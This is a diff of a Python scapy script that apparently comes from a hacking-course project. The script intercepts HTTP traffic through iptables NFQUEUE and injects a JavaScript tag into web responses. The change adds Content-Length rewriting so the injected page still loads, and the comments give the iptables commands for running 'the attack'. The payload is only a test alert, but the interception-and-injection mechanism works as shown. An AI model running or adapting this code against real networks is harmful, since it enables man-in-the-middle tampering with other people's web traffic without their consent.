@@ -21,7 +21,14 @@ def process_packet(packet):
             
         elif scapy_packet[scapy.TCP].sport == 80:
             print("[+] Response")
-            load = load.replace("</body>", "<script>alert('test');</script></body>")
+            injection_code = "<script>alert('test');</script>"
+            load = load.replace("</body>", injection_code + "</body>")
+            content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
+            if content_length_search :
+                content_length = content_length_search.group(1)
+                new_content_length = int(content_length) + len(injection_code)
+                load = load.replace(content_length, str(new_content_length))
+
             
         if load != scapy_packet[scapy.Raw].load:
             new_packet = set_load(scapy_packet, load)
@@ -43,9 +50,8 @@ queue.run()
 
 # for internal testing . 
 
-# sudo iptables -I INPUT -j NFQUEUE --queue-num 0
 # sudo iptables -I OUTPUT -j NFQUEUE --queue-num 0
-
+# sudo iptables -I INPUT -j NFQUEUE --queue-num 0
 
 
 # After the attack is over dont forget to flush the ip tables 
